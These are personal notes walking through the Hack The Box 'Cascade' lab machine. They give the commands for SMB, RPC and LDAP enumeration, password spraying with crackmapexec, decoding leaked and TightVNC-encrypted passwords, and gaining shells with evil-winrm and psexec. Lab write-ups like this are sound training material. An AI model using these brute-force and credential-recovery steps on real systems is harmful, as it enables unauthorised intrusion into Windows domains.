`sudo nmap -sC -sV -oA nmap/cascade 10.10.10.182`
`-sC for default scripts`
`-sV for enumerate all versions`
`-oA output all formats`

![[Pasted image 20250112184635.png]]
Adding FQDN and hostname to `/etc/hosts`

![[Pasted image 20250112184752.png]]
#smbenumeration 

#rpcclient 

`rpcclient -U '' 10.10.10.182`

`enumdomusers`

![[Pasted image 20250112185023.png]]
Lots of usernames. Copy them to tmp file for cleanup. 

`cat tmp | awk -F\[ '{print $2}' | awk -F \]'{print $1}' > users.lst`

![[Pasted image 20250112185426.png]]

Back to rpcclient enum 

`querydispinfo` to see if there's anything in a description field (there isn't)

![[Pasted image 20250112185536.png]]

Enumerate file shares with #crackmapexec 

`crackmapexec smb 10.10.10.182 --shares`

`crackmapexec smb 10.10.10.182 -u '' --shares`

`crackmapexec smb 10.10.10.182 -u '' -p '' --shares`
![[Pasted image 20250112185812.png]]

Enumerate files with #smbclient 

`smbclient -L //10.10.10.182`

`smbclient -U '' -L //10.10.10.182`

![[Pasted image 20250112190040.png]]

Nothing here.

Start up a brute force. 

Creating custom password list. Starting with:

![[Pasted image 20250112190331.png]]

Using #hashcat to mutate list. 

`hashcat --force passwords -r /usr/share/hashcat/rules/best64.rule --stdout > t`

`sort -u t > passwords`

Before running this brute force, check the password policy. 

Can check with #crackmapexec 

`crackmapexec smb 10.10.10.182 --pass-pol`

![[Pasted image 20250112190748.png]]
Min password length is 5
No lockout threshold. G2G.

Time to bruteforce with #crackmapexec 

`crackmapexec smb 10.10.10.182 -u users.lst -p passwords`

While this is bruteforcing, enumerate #LDAP 

Using #ldapsearch 

`ldapsearch -x -h 10.10.10.182 -s base namingcontexts` to get what the domain is. DC=cascade,DC=local

![[Pasted image 20250112191216.png]]
Use that info for next query:

`ldapsearch -x -h 10.10.10.182 -s sub -b 'DC=cascade,DC=local' > tmp

Sorting this information by # of times it occurs. Checking for anomalies. 

`cat tmp | awk '{print $1}' | sort | uniq -c | sort -nr`

![[Pasted image 20250112191706.png]]

Using this string to search through the entire ldapsearch and get a password. 

![[Pasted image 20250112191848.png]]
and getting sam account name: r.thompson

![[Pasted image 20250112191934.png]]

Decode base64 password with 

`echo -n clk0bjVldmE= | base64 -d`

![[Pasted image 20250112200612.png]] 

Pass is: rY4n5eva

Testing these creds with #crackmapexec 

`crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva`

![[Pasted image 20250112200824.png]]
Login, but no pwned. 

Try with winrm 

`crackmapexec winrm 10.10.10.182 -u r.thompson -p rY4n5eva`

No login. 

Enumerate shares again:

`crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva --shares`

![[Pasted image 20250112201019.png]]
Unique shares to investigate: `print$` and `Data`

New #crackmapexec flag: `spider_plus` will crawl the smb shares we have access to and write them to JSON files.

`crackmapexec smb 10.10.10.182 -u r.thompson -M spider_plus

![[Pasted image 20250112201253.png]]

Lots of stuff to potentially go through.

![[Pasted image 20250112201753.png]]

Mounting the SMB Share as R.Thompson in order to view the files in Data share

Mount data
`sudo mount -t cifs -o 'user=r.thompson,password=rY4n5eva' //10.10.10.182/Data /mnt/data/`

![[Pasted image 20250112202228.png]]

Mount NetLogon

`sudo mount -t cifs -o 'user=r.thompson,password=rY4n5eva' //10.10.10.182/NetLogon /mnt/netlogon/`

Can view drive maps from netlogon

 ![[Pasted image 20250112202443.png]]
 No passwords here. 

Enumerating data directory. 

`find . -type f`

![[Pasted image 20250112202650.png]]
Looking at the email. 

Got a new username, but this is from 2018 (old).

![[Pasted image 20250112202835.png]]

the VNC Install.reg file contains an encrypted password:

![[Pasted image 20250112203118.png]]

Go to cyberchef to convert hex password to plaintext?

This isn't the way. 

Googling "tightvnc registry password decrypt" and discover github repo with POC on how to decrypt using metasploit

Following instructions from the github. 


`$> msfconsole

`msf5 > irb
`[*] Starting IRB shell...
`[*] You are in the "framework" object

`>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
 `=> "\u0017Rk\u0006#NX\a"
`>> require 'rex/proto/rfb'
 `=> true
`>> Rex::Proto::RFB::Cipher.decrypt ["INSERTHEXHERE"].pack('H*'), fixedkey
`` => "Secure!\x00"

![[Pasted image 20250112204116.png]]

Got the password: sT333ve2

Discovering user for this password using #crackmapexec 

`cme smb 10.10.10.182 -u users.lst -p st333ve2`

![[Pasted image 20250112204308.png]]
Got username: s.smith

Try creds with winrm 

`cme winrm 10.10.10.182 -u s.smith -p st333ve2`

GOT PWN3D!

![[Pasted image 20250112204502.png]]
Connect with #evilwinrm 

`evil-winrm -i 10.10.10.182 -u s.smith -p st333ve2`

Enumerate as s.smith

`whoami /all` 

`net user r.thompson /domain`

`net user s.smith /domain`


Mounting the audit share 

`sudo mount -t cifs -o 'user=s smith, password=sT333ve2' //10.10.10.182/audit$ /mnt/audit`

`cd /mnt/audit`
![[Pasted image 20250112205213.png]]
Determine file type:

`file CascAudit.exe` which is a .NET Assembly file.

![[Pasted image 20250112205354.png]]

`file Audit.db` which is a SQLite file

![[Pasted image 20250112205530.png]]
View contents of database with:

`sqlite3 Audit.db .dump`

![[Pasted image 20250112205633.png]]
Got a credential!

Base64 decode.

`echo BQ0515Kj9MdErXx6Q6AG0w= | base64 -d`

![[Pasted image 20250112205739.png]]

Output: `D|zC;`

These creds don't work with #crackmapexec 

![[Pasted image 20250112205859.png]]
Switched to a windows box to use #DNSPY to decompile the CascAudit DotNet application

![[Pasted image 20250112210241.png]]
Set a breakpoint at this decryption point. 

Step Over after breakpoint is reached.

Can see the password the password here.

![[Pasted image 20250112210426.png]]

Using this password with arksvc user 

`cme smb 10.10.10.182 -u arksvc -p w3lc0meFr31nd`

![[Pasted image 20250112210607.png]]
Login, no pwn3d.

Login with winrm?

`cme winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd`

![[Pasted image 20250112210749.png]]
Yes.

Using #evilwinrm again to login with these creds.

`evil-winrm -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd`

![[Pasted image 20250112210914.png]]
View privileges we have with 

`whoami /all`

We are in the `AD Recycle Bin` Group

![[Pasted image 20250112211029.png]]

`net user arksvc`

![[Pasted image 20250112211100.png]]

This group can query for deleted items.

Google "Powershell query deleted items"

`Get-ADObject -SearchBase "CN=Deleted Objects,DC=Cascade,DC=Local" -Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties * | ft`

![[Pasted image 20250112211324.png]]
Removing format table command

![[Pasted image 20250112211438.png]]
We have two deleted objects.

Can see the cascade legacy password. 

`YmFDVDNyMWFOMDBkbGVZ`

![[Pasted image 20250112211606.png]]

decode this:

`echo -n YmFDVDNyMWFOMDBkbGVZ | base54 -d`

![[Pasted image 20250112211653.png]]

`baCT3r1aN00dles` lulz.

Trying these creds with #crackmapexec and finally get pwn3d


![[Pasted image 20250112211954.png]]

Get a shell with #psexec 

![[Pasted image 20250112212015.png]]
